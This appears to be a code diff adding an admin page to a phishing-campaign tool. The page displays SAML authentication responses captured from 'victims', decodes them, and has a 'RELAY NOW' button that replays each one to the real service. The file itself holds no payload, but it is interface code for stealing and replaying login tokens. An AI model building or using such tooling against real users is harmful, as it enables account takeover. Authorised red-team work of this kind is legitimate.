@@ -1,0 +1,116 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">CAPTURED SAML RESPONSES</h1>
+    <div class="flex gap-3">
+      <a href="{{ url_for('campaigns_admin.admin_saml_config', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">SAML CONFIG</a>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">CAMPAIGN INFO</a>
+    </div>
+  </div>
+
+  <div class="brutal-card p-6 mb-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-2">{{ campaign.name }}</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400">
+      SAMLResponses captured from campaign recipients.
+      {% if captures %}{{ captures | length }} response(s) captured.{% endif %}
+    </p>
+  </div>
+
+  {% if captures %}
+  <div class="brutal-card p-6 mb-6">
+    <h3 class="text-lg font-bold font-mono-brutal mb-4">Summary</h3>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">TOTAL CAPTURED</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ captures | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">RELAYED</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ captures | selectattr('relayed_to') | list | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">RELAY SUCCESSES</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ captures | selectattr('relay_status', 'equalto', '200') | list | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">UNIQUE RECIPIENTS</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ captures | map(attribute='recipient_token') | unique | list | length }}</div>
+      </div>
+    </div>
+  </div>
+
+  {% for c in captures %}
+  <div class="brutal-card p-6 mb-4">
+    <div class="flex items-center justify-between mb-3">
+      <div class="font-mono-brutal font-bold">
+        #{{ c.id }}
+        <span class="text-gray-500 text-sm ml-2">{{ c.captured_at.strftime('%Y-%m-%d %H:%M:%S') if c.captured_at else '-' }}</span>
+      </div>
+      <div class="flex items-center gap-2">
+        {% if c.relayed_to %}
+        <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-brutal-emerald text-brutal-emerald">
+          RELAYED {{ c.relay_status or '' }}
+        </span>
+        {% else %}
+        <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-gray-400 text-gray-500">
+          CAPTURED ONLY
+        </span>
+        <form method="post" action="{{ url_for('campaigns_admin.admin_saml_relay', cid=campaign.id, capture_id=c.id) }}" class="inline">
+          <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+          <button type="submit" class="px-2 py-1 border-2 border-brutal-red text-brutal-red font-bold hover:bg-brutal-red hover:text-white transition-all font-mono-brutal text-xs"
+                  onclick="return confirm('Relay this SAMLResponse to the real ACS URL?')">RELAY NOW</button>
+        </form>
+        {% endif %}
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm font-mono-brutal mb-3">
+      <div>
+        <span class="text-gray-500">Recipient Token:</span>
+        <span class="break-all">{{ c.recipient_token or '-' }}</span>
+      </div>
+      <div>
+        <span class="text-gray-500">Relay State:</span>
+        <span class="break-all">{{ c.relay_state or '-' }}</span>
+      </div>
+      {% if c.relayed_to %}
+      <div class="md:col-span-2">
+        <span class="text-gray-500">Relayed To:</span>
+        <span class="break-all">{{ c.relayed_to }}</span>
+      </div>
+      {% endif %}
+    </div>
+
+    {% if c.saml_response %}
+    <div class="mt-3">
+      <div class="font-mono-brutal text-xs font-bold text-gray-500 mb-1">SAML RESPONSE (BASE64)</div>
+      <div class="bg-off-white dark:bg-black p-2 border-2 border-gray-300 dark:border-gray-700 break-all text-xs font-mono max-h-24 overflow-y-auto">{{ c.saml_response }}</div>
+    </div>
+    {% if c.saml_response_decoded %}
+    <div class="mt-3">
+      <div class="font-mono-brutal text-xs font-bold text-gray-500 mb-1">DECODED SAML XML</div>
+      <pre class="bg-off-white dark:bg-black p-2 border-2 border-gray-300 dark:border-gray-700 text-xs font-mono max-h-48 overflow-y-auto whitespace-pre-wrap">{{ c.saml_response_decoded }}</pre>
+    </div>
+    {% endif %}
+    {% endif %}
+  </div>
+  {% endfor %}
+
+  {% else %}
+  <div class="brutal-card p-6">
+    <p class="font-mono-brutal text-gray-500 dark:text-gray-400 text-center py-8">
+      No SAML responses captured yet. Responses will appear here when victims complete IdP authentication.
+    </p>
+  </div>
+  {% endif %}
+</div>
+{% endblock %}
